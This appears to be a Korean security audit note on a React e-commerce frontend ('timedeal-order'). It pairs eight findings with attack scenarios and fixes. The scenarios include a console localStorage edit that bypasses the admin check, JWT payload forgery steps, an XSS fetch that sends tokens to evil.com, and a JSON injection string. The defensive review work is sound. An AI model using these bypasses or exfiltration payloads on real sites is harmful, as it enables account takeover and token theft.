---
title: timedeal-order 프론트엔드 보안 취약점 분석
tags:
  - 보안
  - 취약점분석
  - React
  - 프론트엔드
  - timedeal
  - JWT
  - XSS
aliases:
  - timedeal 보안분석
  - frontend 취약점
date: 2026-03-23
category: 2_기술_분석/보안
status: 완성
priority: 높음
---

# 🎯 timedeal-order 프론트엔드 보안 취약점 분석

> [!note] 분석 대상
> - 경로: `/Users/a1234/Goorm4I/timedeal-order`
> - 프레임워크: React 19.2.4 (react-scripts 5.0.1)
> - HTTP 클라이언트: Axios 1.13.5
> - 분석일: 2026-03-23

---

## 📑 목차
- [[#1. 취약점 요약표|취약점 요약표]]
- [[#2. CRITICAL — 클라이언트 사이드 어드민 체크|CRITICAL: 클라이언트 어드민 체크]]
- [[#3. HIGH — JWT 서명 검증 없음|HIGH: JWT 서명 검증 없음]]
- [[#4. HIGH — localStorage 토큰 저장|HIGH: localStorage 토큰 저장]]
- [[#5. HIGH — .env 파일 git 노출|HIGH: .env git 노출]]
- [[#6. MEDIUM — 결제 금액 URL 파라미터 노출|MEDIUM: 결제 금액 URL 노출]]
- [[#7. MEDIUM — WebSocket 인증 없음|MEDIUM: WebSocket 인증 없음]]
- [[#8. MEDIUM — order.js JSON 인젝션|MEDIUM: JSON 인젝션]]
- [[#9. LOW — 외부 스크립트 SRI 없음|LOW: 외부 스크립트 SRI]]

---

## 1. 취약점 요약표

| 취약점 | 파일 | 위험도 | 즉시 조치 |
|--------|------|--------|----------|
| 클라이언트 사이드 어드민 체크 | AdminRoute.jsx | 🔴 CRITICAL | 백엔드 권한 검증 필수 |
| JWT 서명 검증 없음 | auth.js | 🔴 HIGH | 프론트 payload 신뢰 금지 |
| localStorage 토큰 저장 | auth.js | 🔴 HIGH | httpOnly 쿠키로 전환 |
| .env git 노출 | .env | 🔴 HIGH | .gitignore 추가 즉시 |
| 결제 금액 URL 노출 | OrderCheckout.jsx | 🟡 MEDIUM | 서버에서 금액 조회 |
| WebSocket 인증 없음 | websocket.js | 🟡 MEDIUM | 토큰 핸드셰이크 추가 |
| JSON 인젝션 가능성 | order.js | 🟡 MEDIUM | 객체 직렬화로 교체 |
| 외부 스크립트 SRI 없음 | AddressManager.jsx | 🟢 LOW | integrity 속성 추가 |

---

## 2. CRITICAL — 클라이언트 사이드 어드민 체크

### 취약 코드

```js
// src/components/AdminRoute.jsx
const ADMIN_EMAILS = (
  process.env.REACT_APP_ADMIN_EMAILS || 'admin@test.com'
).split(',').map(e => e.trim().toLowerCase());
```

```js
// src/App.js
<Route path="/admin" element={
  <AdminRoute>
    <AdminPage />
  </AdminRoute>
} />
```

`AdminRoute` 내부에서 `getCurrentUser()`로 **localStorage 값을 읽어 이메일 비교**

### 공격 시나리오

```js
// 브라우저 콘솔에서 2줄로 어드민 접근
localStorage.setItem('user', JSON.stringify({ id: '99', email: 'admin@test.com' }))
location.href = '/admin'
// → AdminPage 완전 접근, 딜 생성/수정/삭제 가능
```

> [!danger] 위험
> 백엔드 검증 없이 관리자 기능 전체 노출. 누구나 콘솔 2줄로 어드민 진입 가능.

### 조치 방안

- Admin 여부를 프론트에서 판단하지 말 것
- 모든 `/admin/**` API 요청에서 **백엔드가 JWT 기반으로 권한 검증**
- 프론트 `AdminRoute`는 UX용 게이트로만 유지 (보안 목적으로 사용 금지)

---

## 3. HIGH — JWT 서명 검증 없음

### 취약 코드

```js
// src/api/auth.js
const payload = JSON.parse(
  atob(accessToken.split('.')[1].replace(/-/g, '+').replace(/_/g, '/'))
);
const userData = { id: payload.sub, email };
```

### 문제점

- `atob()`은 Base64 디코딩만 할 뿐, **서명(Signature) 검증 없음**
- 조작된 JWT를 넣어도 payload를 그대로 신뢰함

### 공격 시나리오

```
1. 정상 accessToken 탈취 또는 임의 생성
2. payload 부분을 Base64로 직접 인코딩해서 sub 값 변조
   예) {"sub": "victim_user_id", "email": "hacker@evil.com"}
3. localStorage.setItem('accessToken', 조작된_토큰)
4. 피해자 계정 ID로 API 요청 전송
```

> [!danger] 위험
> 타 사용자 사칭 가능. 백엔드가 서명 검증 안 하면 계정 탈취로 이어짐.

### 조치 방안

- JWT 검증은 **백엔드에서만** 수행
- 프론트는 payload를 UI 표시용으로만 참조
- 실제 권한 판단은 항상 서버 응답 기준으로

---

## 4. HIGH — localStorage 토큰 저장

### 취약 코드

```js
// src/api/auth.js
localStorage.setItem('accessToken', accessToken);
localStorage.setItem('refreshToken', refreshToken);
```

### 문제점

- localStorage는 동일 Origin의 **모든 JS 코드에서 접근 가능**
- XSS 공격 한 번이면 토큰 전량 탈취

### 공격 시나리오

```
1. 서비스 내 어디서든 XSS 취약점 발생
2. <script>
     fetch('https://evil.com?t=' + localStorage.getItem('accessToken'))
   </script>
3. 공격자 서버에 accessToken + refreshToken 전송
4. 토큰 그대로 API 호출 → 계정 완전 탈취
```

### 조치 방안

- 토큰을 `httpOnly` 쿠키로 전환 (백엔드 `Set-Cookie` 설정)
- JS에서 `document.cookie`로 접근 불가한 httpOnly 속성 적용
- `Secure`, `SameSite=Strict` 속성도 함께 설정

---

## 5. HIGH — .env 파일 git 노출

### 취약 내용

```bash
# .env (레포에 커밋된 상태)
REACT_APP_API_URL=https://pposiraegi.cloud
REACT_APP_WS_URL=wss://pposiraegi.cloud/ws/events
REACT_APP_ADMIN_EMAILS=admin@test.com
```

### 공격 시나리오

```
1. GitHub 레포 공개 or 내부 유출
2. REACT_APP_ADMIN_EMAILS 값 확인 → admin@test.com
3. 해당 이메일로 회원가입 → AdminRoute 체크 통과
4. 운영 API 도메인 파악 → 직접 API 공격 가능
```

### 조치 방안

```bash
echo ".env" >> .gitignore
echo ".env.local" >> .gitignore
git rm --cached .env
git commit -m "remove .env from tracking"
```

- 민감값은 `.env.local`로 이동 (git 추적 제외)
- 레포에는 `.env.example`만 커밋 (더미값으로 구성)
- git 히스토리에 이미 커밋된 경우 `git filter-branch` 또는 BFG로 삭제 필요

---

## 6. MEDIUM — 결제 금액 URL 파라미터 노출

### 취약 코드

```js
// src/pages/OrderCheckout.jsx
const pgUrl = `https://mock-pg-1046420547293.us-central1.run.app/checkout`
  + `?orderId=${newCheckoutId}`
  + `&amount=${deal.discountPrice}`   // ← 금액이 URL에 평문 노출
  + `&returnUrl=${encodeURIComponent(callbackUrl)}`;
```

### 공격 시나리오

```
1. 개발자도구 Network 탭에서 PG URL 확인
2. amount=50000 → amount=1 로 변조 후 직접 요청
3. Mock PG가 금액 검증 없이 처리하면 1원 결제 성공
```

### 조치 방안

- 금액은 서버가 `orderId` 기준으로 내부에서 조회
- 프론트 → PG로 금액 직접 전달하지 말 것
- PG 응답 콜백에서도 서버 측 금액 재검증 필수

---

## 7. MEDIUM — WebSocket 인증 없음

### 취약 코드

```js
// src/api/websocket.js
this.ws = new WebSocket(WS_URL);  // 토큰 없이 연결

this.ws.onmessage = (event) => {
  const data = JSON.parse(event.data);  // 검증 없는 파싱
  this.notifyListeners(data);
};
```

### 공격 시나리오

```
1. wss://pposiraegi.cloud/ws/events 에 익명 연결
2. 실시간 재고/딜 정보 무단 수신 → 경쟁 우위 확보
3. 악성 JSON 메시지 전송 → JSON.parse 예외로 앱 크래시
```

### 조치 방안

```js
// 연결 시 토큰 전달
this.ws = new WebSocket(`${WS_URL}?token=${accessToken}`)

// 메시지 파싱 방어
this.ws.onmessage = (event) => {
  try {
    const data = JSON.parse(event.data);
    this.notifyListeners(data);
  } catch(e) {
    console.warn('Invalid WS message:', e);
  }
};
```

---

## 8. MEDIUM — order.js JSON 인젝션

### 취약 코드

```js
// src/api/order.js
const res = await axios.post(
  `${API_BASE_URL}/api/v1/orders`,
  `{"orderItems":[{"skuId":${skuId},"quantity":${quantity}}]}`,  // 템플릿 리터럴 직접 삽입
  { headers: { ...getAuthHeader(), 'Content-Type': 'application/json' } }
);
```

### 공격 시나리오

```
skuId가 외부에서 조작 가능한 경우:
skuId = 1}],"malicious":[{"skuId":999
→ 완성 JSON: {"orderItems":[{"skuId":1}],"malicious":[{"skuId":999,"quantity":1}]}
```

### 조치 방안

```js
// 객체 직렬화로 교체 (JSON 인젝션 원천 차단)
await axios.post(
  url,
  { orderItems: [{ skuId, quantity }] },
  { headers: getAuthHeader() }
)
```

---

## 9. LOW — 외부 스크립트 SRI 없음

### 취약 코드

```js
// src/pages/AddressManager.jsx
const script = document.createElement('script');
script.src = 'https://t1.daumcdn.net/mapjsapi/bundle/postcode/prod/postcode.v2.js';
// integrity 속성 없음
document.head.appendChild(script);
```

### 위험

CDN 탈취 시 악성 스크립트가 `window.daum` 객체로 실행되어 사용자 입력 탈취 가능

### 조치 방안

```js
script.integrity = 'sha384-[해시값]';
script.crossOrigin = 'anonymous';
```

또는 Daum Postcode SDK를 npm 패키지로 로컬 번들링.

---

## 🎯 우선 조치 순서

1. `.env` → `.gitignore` 추가 + git 히스토리에서 제거
2. AdminPage API 전체에 백엔드 권한 검증 추가
3. localStorage 토큰 → httpOnly 쿠키로 전환 (백엔드 협업 필요)
4. order.js 템플릿 리터럴 → 객체 직렬화로 교체
5. WebSocket 연결 시 토큰 핸드셰이크 추가
6. 결제 금액 서버 측 검증 로직 추가
